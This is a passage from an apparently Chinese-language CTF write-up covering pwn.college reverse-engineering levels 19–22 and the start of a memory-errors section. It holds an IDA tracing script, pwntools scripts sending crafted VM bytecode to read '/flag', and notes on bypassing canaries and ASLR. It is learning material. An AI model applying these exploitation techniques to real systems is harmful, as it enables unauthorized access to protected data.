a1 &amp; <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;E&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;N&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">0x10</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;Z&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a1:<br>        flag_description += <span class="hljs-string">&#x27;*&#x27;</span><br>    <span class="hljs-keyword">return</span> flag_description<br><br><span class="hljs-comment"># call ins 那里下断点，做条件断点</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># func_name = GetFunctionName(0x0000555555555A76)  # GetFunctionName() -&gt; idc.get_func_name()</span><br>    rdi = GetRegValue(<span class="hljs-string">&quot;rdi&quot;</span>)<br>    arg1 = rdi<br>    info_reg = <span class="hljs-string">&quot;[V] a:0x&#123;:02x&#125; b:0x&#123;:02x&#125; c:0x&#123;:02x&#125; d:0x&#123;:02x&#125; s:0x&#123;:02x&#125; i:0x&#123;:02x&#125; f:0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<br>        Byte(arg1 + <span class="hljs-number">0x400</span>),<br>        Byte(arg1 + <span class="hljs-number">0x401</span>),<br>        Byte(arg1 + <span class="hljs-number">0x402</span>),<br>        Byte(arg1 + <span class="hljs-number">0x403</span>),<br>        Byte(arg1 + <span class="hljs-number">0x404</span>),<br>        Byte(arg1 + <span class="hljs-number">0x405</span>),<br>        Byte(arg1 + <span class="hljs-number">0x406</span>)) <span class="hljs-comment"># 0x404 -&gt; s为栈指针</span><br>    <span class="hljs-built_in">print</span>(info_reg)<br>    rsi = GetRegValue(<span class="hljs-string">&quot;rsi&quot;</span>)<br>    arg2 = rsi &amp; <span class="hljs-number">0xff</span>           <span class="hljs-comment"># 0x010804 里的低8位 0x04</span><br>    arg1 = (rsi &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>    <span class="hljs-comment"># 0x010804 里的中间8位 0x08</span><br>    op = (rsi &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>     <span class="hljs-comment"># 0x010804 里的高8位 0x01</span><br>    info_op = <span class="hljs-string">&quot;[I] op:0x&#123;:02x&#125;  arg1:0x&#123;:02x&#125;  arg2:0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(op, arg1, arg2)<br>    <span class="hljs-built_in">print</span>(info_op)<br>    <br>    <span class="hljs-comment"># 之后就是各个函数了</span><br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># imm</span><br>        imm = <span class="hljs-string">&quot;[s] IMM &#123;:s&#125; = 0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), arg2)<br>        <span class="hljs-built_in">print</span>(imm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># add</span><br>        add = <span class="hljs-string">&quot;[s] ADD &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(add)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># stk</span><br>        stk = <span class="hljs-string">&quot;[s] STK &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(stk)<br>        <span class="hljs-keyword">if</span> arg2 != <span class="hljs-number">0</span>:<br>            push = <span class="hljs-string">&quot;[s] ... push &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg2))<br>            <span class="hljs-built_in">print</span>(push)<br>        <span class="hljs-keyword">if</span> arg1 != <span class="hljs-number">0</span>:<br>            pop = <span class="hljs-string">&quot;[s] ... pop &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1))<br>            <span class="hljs-built_in">print</span>(pop)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x20</span>) != <span class="hljs-number">0</span>:  <span class="hljs-comment"># stm</span><br>        stm = <span class="hljs-string">&quot;[s] STM *&#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(stm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># idm</span><br>        ldm = <span class="hljs-string">&quot;[s] LDM &#123;:s&#125; *&#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(ldm)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># cmp</span><br>        cmp = <span class="hljs-string">&quot;[s] CMP &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(cmp)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x10</span> ) != <span class="hljs-number">0</span>: <span class="hljs-comment"># jmp</span><br>        jmp = <span class="hljs-string">&quot;[s] JMP &#123;:s&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_flags(arg2), des_reg(arg1))<br>        <span class="hljs-built_in">print</span>(jmp)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arg1 <span class="hljs-keyword">or</span> arg1 &amp; Byte(arg1+<span class="hljs-number">0x406</span>) != <span class="hljs-number">0</span>:<br>            jmp_true = <span class="hljs-string">&quot;    [j] ... TAKEN&quot;</span><br>            <span class="hljs-built_in">print</span>(jmp_true)<br>        <span class="hljs-keyword">else</span>:<br>            jmp_false = <span class="hljs-string">&quot;    [j] ... NOT TAKEN&quot;</span><br>            <span class="hljs-built_in">print</span>(jmp_false)<br>    <span class="hljs-keyword">if</span> (op &amp; <span class="hljs-number">0x80</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># sys</span><br>        sys = <span class="hljs-string">&quot;[s] SYS 0x&#123;:02x&#125; &#123;:s&#125;&quot;</span>.<span class="hljs-built_in">format</span>(arg2, des_reg(arg2))<br>        <span class="hljs-built_in">print</span>(sys)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">1</span> != <span class="hljs-number">0</span>:<br>            sys_open = <span class="hljs-string">&quot;    [s] ... open&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_open)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>            sys_read = <span class="hljs-string">&quot;    [s] ... read code&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_read)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">0x20</span> != <span class="hljs-number">0</span>:<br>            sys_read_memory = <span class="hljs-string">&quot;    [s] ... read_memory&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_read_memory)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">0x10</span> != <span class="hljs-number">0</span>:<br>            sys_write = <span class="hljs-string">&quot;    [s] ... write&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_write)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:<br>            sys_sleep = <span class="hljs-string">&quot;    [s] ... sleep&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_sleep)<br>        <span class="hljs-keyword">if</span> arg2 &amp; <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            sys_exit = <span class="hljs-string">&quot;    [s] ... exit&quot;</span><br>            <span class="hljs-built_in">print</span>(sys_exit)<br>        <span class="hljs-keyword">if</span> arg1:<br>            return_info = <span class="hljs-string">&quot;    [s] ... return value (in register &#123;:s&#125;): not 0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), arg2)<br>            <span class="hljs-built_in">print</span>(return_info)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><p>​然后这里我删去了0x88，0x89的两个数据，总共发送6个数据成功。这里怀疑对于长度存在限制。下面就是关键比较位置的指令打印，这里a就是输入(输入123465789)，b就是内置比较数据，他们一开始比较最后一个位置，即0x8f，然后往前比较。这里0x36对应的数据是6，可以验证接收的输入长度为6，同时猜测这里的c就是长度。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x36</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x7c</span> <span class="hljs-selector-tag">c</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x06</span> <span class="hljs-selector-tag">d</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xff</span> <span class="hljs-selector-tag">s</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x08</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xc6</span> <span class="hljs-selector-tag">f</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x00</span><br><span class="hljs-selector-attr">[I]</span> <span class="hljs-selector-tag">op</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x08</span>  <span class="hljs-selector-tag">arg1</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x01</span>  <span class="hljs-selector-tag">arg2</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x20</span><br><span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-tag">CMP</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure><p>​再后面的指令中找到跳转条件是判断c，可以肯定c就是数据长度。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x35</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x8f</span> <span class="hljs-selector-tag">c</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x00</span> <span class="hljs-selector-tag">d</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x58</span> <span class="hljs-selector-tag">s</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x05</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xba</span> <span class="hljs-selector-tag">f</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x11</span><br><span class="hljs-selector-attr">[I]</span> <span class="hljs-selector-tag">op</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x10</span>  <span class="hljs-selector-tag">arg1</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x04</span>  <span class="hljs-selector-tag">arg2</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x10</span><br><span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-tag">JMP</span> <span class="hljs-selector-tag">Z</span> <span class="hljs-selector-tag">c</span><br>    <span class="hljs-selector-attr">[j]</span> ... <span class="hljs-selector-tag">TAKEN</span><br></code></pre></td></tr></table></figure><h2 id="level-20"><a class="markdownIt-Anchor" href="#level-20"></a> level 20</h2><p>​这里和 level 19 差不多，不同点在于它是先把输入加一个数然后进行比较，这个最后比较的数据没有直接给出，而是比对一个成功才给出下一个比较。感觉可以爆破一下，用返回数据来查看数值是否正确。总共0xe个数据，我就直接从后面一个一个输入比对了。</p><p>​经过对于 20.1 的调试，发现最后数据存在于栈中，只要在动调中根据偏移来寻找即可。</p><h2 id="level-21"><a class="markdownIt-Anchor" href="#level-21"></a> level 21</h2><p>​这里就是要求使用程序的规则来写汇编了。贴一个 21.0 的代码，主要还是借鉴 level 19 的查看&quot;/flag&quot;的方法。而 21.1 则是改变了寄存器的位置，同时将参数1，2的位置颠倒了，需要根据程序进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyrev_level[0-9][0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br><br><span class="hljs-comment"># 8 a, 64 b, 4 c, 1 d, 16 s, 32 i, 2 f</span><br>open_flag = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x2f</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># /   0x2f  -&gt; IMM d 0x2f, IMM c = 0x80, STM *c = d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x81</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># f         -&gt; 这里都是赋予&quot;/flag&quot;,然后open打开这个地址</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x6c</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x82</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># l</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x83</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># a</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x67</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x84</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># g</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x85</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># 0截断</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x1</span>       <span class="hljs-comment"># open打开  -&gt; IMM a = 0x80, IMM b = 0, SYS 0x10(open) d</span><br>]       <span class="hljs-comment">#三个 op arg1 arg2</span><br>read_len = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x10</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0xff</span>,     <span class="hljs-comment"># IMM c = 0xff</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM a = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># ADD a d</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>      <span class="hljs-comment"># SYS 0x4(read memory) d </span><br>]<br>write_to_terminal = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x10</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM c = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># ADD c d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># IMM a = 0x1</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>      <span class="hljs-comment"># SYS 0x10(write) d</span><br>] <br>bytes_list = <span class="hljs-built_in">bytes</span>(open_flag + read_len + write_to_terminal + [<span class="hljs-number">0x80</span>])  <span class="hljs-comment"># 后面的0x80是为了报错返回，防止一直无限循环(没写调用exit的简单处理方法)</span><br>r.send(bytes_list)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-22"><a class="markdownIt-Anchor" href="#level-22"></a> level 22</h2><p>​对于 22.0 ，就是根据它的响应值来判断寄存器和指令的位置及作用。指令很少，一个一个尝试就出来了，下面注释就是具体的指令指代。然后按照上一次的相关指令即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyrev_level[0-9][0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br><br><span class="hljs-comment"># 三个 arg1 op arg2</span><br><br><span class="hljs-comment"># 0x1 CMP, 0x2 IMM, 0x4 IDM, 0x8 ADD, 0x10 STM, 0x20 STK, 0x80 SYS # 0x40应该是JMP</span><br><span class="hljs-comment"># 0x1 c,   0x2 f  , 0x4 b  , 0x8 i  , 0x10 a  , 0x20 d  , 0x80 s # 0x80存疑，只有7个寄存器，最高为0x40</span><br><br><span class="hljs-comment"># SYS arg1 -&gt; 0x1 open, 0x2 write, 0x4 sleep, 0x20 read_code, 0x40 exit, 0x80 read_memory </span><br><span class="hljs-comment"># IMM --&gt; des(arg1) = arg2</span><br><span class="hljs-comment"># STM --&gt; *des(arg1) = des(arg2)</span><br><span class="hljs-comment"># ADD --&gt; des(arg1) += des(arg2)</span><br><span class="hljs-comment"># SYS --&gt; arg1 des(arg2)</span><br>open_flag = [<br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x2f</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># /   0x2f  -&gt; IMM d 0x2f, IMM c = 0x80, STM *c = d</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x81</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># f         -&gt; 这里都是赋予&quot;/flag&quot;,然后open打开这个地址</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x6c</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x82</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># l</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x83</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># a</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x67</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x84</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># g</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,  <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x85</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># 0截断</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>       <span class="hljs-comment"># open打开  -&gt; IMM a = 0x80, IMM b = 0, SYS 0x11(open) d</span><br>] <br>read_len = [<br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x80</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xff</span>,     <span class="hljs-comment"># IMM c = 0xff</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,     <span class="hljs-comment"># IMM a = 0</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x20</span>,    <span class="hljs-comment"># ADD a d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>    <span class="hljs-comment"># SYS 0x80(read memory) d </span><br>]<br>write_to_terminal = [<br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x80</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM c = 0</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># ADD c d</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x01</span>,    <span class="hljs-comment"># IMM a = 0x1</span><br>    <span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>     <span class="hljs-comment"># SYS 0x2(write) d</span><br>] <br>exit = [<span class="hljs-number">0x40</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>] <span class="hljs-comment"># SYS 0x40(exit) d</span><br>bytes_list = <span class="hljs-built_in">bytes</span>(open_flag+read_len+write_to_terminal+exit)<br>r.send(bytes_list)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="memory-errors"><a class="markdownIt-Anchor" href="#memory-errors"></a> Memory Errors</h1><h2 id="基础知识-3"><a class="markdownIt-Anchor" href="#基础知识-3"></a> 基础知识</h2><ul><li><p>C 将数据和指令混合在一起，同时不对非法访问做出错误响应，这也就导致存在内存错误问题。</p></li><li><p>存在的问题</p><ul><li>不存储长度信息导致数据覆盖</li><li>栈溢出</li><li>整数溢出</li></ul></li><li><p>编译 <code>gcc -fno-stack-protector -no-pie file.c -o file</code> 允许栈可执行与没有pie</p></li></ul><h3 id="canary"><a class="markdownIt-Anchor" href="#canary"></a> canary</h3><p><a href="https://zhuanlan.zhihu.com/p/613650807">参考: CTFer成长日记13：Canary的基本原理与绕过 - 知乎 (zhihu.com)</a></p><h3 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h3><table><thead><tr><th></th><th>作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td>随机化栈基地址(stack)、共享库(.so\libraries)、mmap 基地址，增加随机化堆基地址(chunk)</td><td>系统功能</td><td>作用于程序(ELF)装入内存运行时</td></tr><tr><td>PIE</td><td>随机化代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)</td><td>编译器功能</td><td>作用于程序(ELF)编译过程中</td></tr></tbody></table><ul><li>禁用aslr<ul><li><code>pwn.process(&quot;./file&quot;,aslr=False)</code></li><li>gdb如果有权限的话，它默认就会禁用aslr。而对于有suid权限的程序，需要先去除这个权限(比如移动位置等)再调试</li><li>启动一个新的禁用aslr的shell，<code>setarch x86_64 -R /bin/bash</code></li></ul></li></ul><h3 id="数据泄露"><a class="markdownIt-Anchor" href="#数据泄露"></a> 数据泄露</h3><ul><li>一个gcc的优化，<code>gcc -o file file.c -03 -fno-inline</code>(-fno-inlie禁用使内联函数堆栈对齐)–这里针对于内存不清除的问题，若是之后在清除内存，然后编译器有很高的优化会忽略这些清理的语句，从而再次导致内存泄露问题。这里提醒在使用变量之前需要先初始化代码中的变量</li></ul><h2 id="level-1-2"><a class="markdownIt-Anchor" href="#level-1-2"></a> level 1</h2><blockquote><p>就是溢出覆盖，多输入点数据即可</p></blockquote><h2 id="level-2-2"><a class="markdownIt-Anchor" href="#level-2-2"></a> level 2</h2><blockquote><p>需要按要求进行覆盖</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>payload_size = <span 